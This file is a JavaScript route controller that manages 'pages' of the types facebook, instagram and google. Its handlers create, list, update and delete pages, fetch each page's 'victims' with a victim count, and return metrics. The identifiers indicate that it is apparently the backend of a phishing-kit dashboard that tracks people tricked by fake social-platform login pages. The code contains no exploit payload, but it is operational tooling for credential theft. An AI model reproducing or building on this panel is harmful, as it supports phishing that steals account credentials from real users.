import { connectToDB } from "../config/dbConnection.js";
import {
  checkPage,
  getVictims,
  getPages,
  createPage as createPageUtil,
  deletePage as deletePageUtil,
  updatePage as updatePageUtil,
} from "../lib/pageUtils.js";
import { getMetrics as getMetricsUtil } from "../lib/metricsUtils.js";
//Create page
export const createPage = async (req, res, next) => {
  try {
    const user_id = req.user_id;
    const { title, type } = req.body;
    await connectToDB();
    await createPageUtil(user_id, type, title);
    res.status(201).json({ message: "Page created successfully" });
  } catch (err) {
    next(err);
  }
};

//get all pages
export const getAllPages = async (req, res, next) => {
  try {
    const user_id = req.user_id;
    await connectToDB();
    const pages = await getPages(user_id, "all");
    res.status(200).json(pages);
  } catch (err) {
    next(err);
  }
};

//get facebook pages
export const getFacebookPages = async (req, res, next) => {
  try {
    const user_id = req.user_id;
    await connectToDB();
    const pages = await getPages(user_id, "facebook");
    res.status(200).json(pages);
  } catch (err) {
    next(err);
  }
};

//get instagram pages
export const getInstagramPages = async (req, res, next) => {
  try {
    const user_id = req.user_id;
    await connectToDB();
    const pages = await getPages(user_id, "instagram");
    res.status(200).json(pages);
  } catch (err) {
    next(err);
  }
};

//get google pages
export const getGooglePages = async (req, res, next) => {
  try {
    const user_id = req.user_id;
    await connectToDB();
    const pages = await getPages(user_id, "google");
    res.status(200).json(pages);
  } catch (err) {
    next(err);
  }
};

//get details of a page
export const getPageDetails = async (req, res, next) => {
  try {
    const user_id = req.user_id;
    const { page_id } = req.params;
    await connectToDB();
    const page = await checkPage(page_id, user_id);
    const pageVictims = await getVictims(page_id);
    const response = {
      message: "page details retrieved successfully",
      page: page,
      victims: pageVictims,
      victimsCount: pageVictims.length,
    };
    res.status(200).json(response);
  } catch (err) {
    next(err);
  }
};

//delete a page
export const deletePage = async (req, res, next) => {
  try {
    const user_id = req.user_id;
    const { page_id } = req.params;
    await connectToDB();
    await deletePageUtil(page_id, user_id);
    res.status(200).json({ message: "Page deleted successfully" });
  } catch (err) {
    next(err);
  }
};

//update a page
export const updatePage = async (req, res, next) => {
  try {
    const user_id = req.user_id;
    const { page_id } = req.params;
    const { title } = req.body;
    await connectToDB();
    await updatePageUtil(page_id, user_id, title);
    res.status(200).json({ message: "Page updated successfully" });
  } catch (err) {
    next(err);
  }
};

export const getMetrics = async (req, res, next) => {
  try {
    const user_id = req.user_id;
    await connectToDB();
    const metrics = await getMetricsUtil(user_id);
    res.status(200).json({
      message: "metrics retrieved successfully",
      metrics: metrics,
    });
  } catch (err) {
    next(err);
  }
};
